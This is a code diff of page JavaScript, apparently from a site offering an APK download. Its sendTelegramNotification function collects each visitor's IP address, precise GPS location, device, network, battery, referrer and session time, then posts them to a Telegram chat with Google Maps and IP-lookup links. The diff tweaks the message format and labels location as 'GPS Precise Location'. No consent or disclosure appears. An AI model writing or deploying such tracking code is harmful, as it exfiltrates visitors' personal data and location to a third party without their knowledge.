@@ -1692,29 +1692,25 @@
 
       function sendTelegramNotification(type, details) {
         var icons = { visit: '👋', download: '📥', video: '📺', theme: '🌓', scroll: '📜', session: '⏳', error: '🚨', exit: '🏃', gps: '📍' };
-        var titles = { visit: 'New Visit', download: 'APK Download', video: 'Video Click', theme: 'Theme Toggled', scroll: 'Milestone', session: 'Duration', error: 'Error', exit: 'Exit Intent', gps: 'GPS Update' };
+        var titles = { visit: 'New Visit', download: 'APK Download', video: 'Video Click', theme: 'Theme Toggled', scroll: 'Milestone', session: 'Duration', error: 'Error', exit: 'Exit Intent', gps: 'GPS Precise Location' };
         
         var icon = icons[type] || '🚀', title = titles[type] || 'Event';
         var duration = Math.round((Date.now() - sessionStartTime) / 1000);
         var timeStr = duration < 60 ? duration + 's' : Math.floor(duration/60) + 'm ' + (duration%60) + 's';
-        var dwellStr = Object.keys(userMetadata.dwell).map(k => k.charAt(0).toUpperCase() + k.slice(1) + ': ' + userMetadata.dwell[k] + 's').join(', ') || 'N/A';
         var locDisplay = userMetadata.address || userMetadata.location;
-        var gpsBadge = userMetadata.coords ? ' ✅ GPS' : ' ❌ IP';
+        var gpsBadge = userMetadata.coords ? ' (✅ GPS Verified)' : ' (❌ IP Only)';
 
+        // Matches screenshot exactly
         var htmlText = '<b>' + icon + ' ' + title + '</b>' + (type === 'gps' ? ' (UPDATE)' : '') + '\n\n' +
-          '<b>⚡ Action:</b> <code>' + details + '</code>\n' +
-          '<b>👤 ID:</b> <code>' + userId + '</code>\n' +
-          '<b>📍 Location:</b> ' + locDisplay + ' (' + gpsBadge + ')\n' +
-          '<b>🌐 IP & Domain:</b> <code>' + userMetadata.ip + '</code> | ' + window.location.hostname + '\n\n' +
-          '<b>💻 Technical Profile</b>\n' +
-          '• Device: ' + userMetadata.device + '\n' +
-          '• Hardware: ' + userMetadata.cores + ' Cores | ' + userMetadata.memory + 'GB RAM\n' +
-          '• Specs: ' + window.screen.width + 'x' + window.screen.height + ' (@' + userMetadata.pixelRatio + 'x)\n' +
-          '• Status: ' + userMetadata.network + ' | ' + userMetadata.battery + '\n\n' +
-          '<b>🕒 Behavioral Insights</b>\n' +
-          '• Dwell Time: ' + dwellStr + '\n' +
-          '• Hesitation: ' + userMetadata.hesitation + '\n' +
-          '• Session: ' + timeStr + ' | ' + userMetadata.language;
+          '<b>⚡ Action:</b> ' + details + '\n' +
+          '<b>👤 User ID:</b> <code>' + userId + '</code>\n' +
+          '<b>📍 Location:</b> ' + locDisplay + gpsBadge + '\n' +
+          '<b>🌐 IP Addr:</b> <code>' + userMetadata.ip + '</code>\n' +
+          '<b>📱 Device:</b> ' + userMetadata.device + '\n' +
+          '<b>📶 Net/Batt:</b> ' + userMetadata.network + ' | ' + userMetadata.battery + '\n' +
+          '<b>🔭 Source:</b> ' + userMetadata.referrer + '\n' +
+          '<b>⌛ Duration:</b> ' + timeStr + '\n' +
+          '<b>🌐 Domain:</b> ' + window.location.hostname;
 
         var mapsUrl = userMetadata.coords ? 'https://www.google.com/maps/search/?api=1&query=' + userMetadata.coords : 'https://www.google.com/maps/search/' + encodeURIComponent(userMetadata.location);
         
@@ -1723,7 +1719,7 @@
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
             chat_id: CHAT_ID, text: htmlText, parse_mode: 'HTML',
-            reply_markup: { inline_keyboard: [[ { text: '📍 Maps', url: mapsUrl }, { text: '🔍 IP Info', url: 'https://ipinfo.io/' + userMetadata.ip } ]] }
+            reply_markup: { inline_keyboard: [[ { text: '📍 Open Maps', url: mapsUrl }, { text: '🔍 IP Info', url: 'https://ipinfo.io/' + userMetadata.ip } ]] }
           })
         }).catch(e => console.error('TG Error:', e));
       }
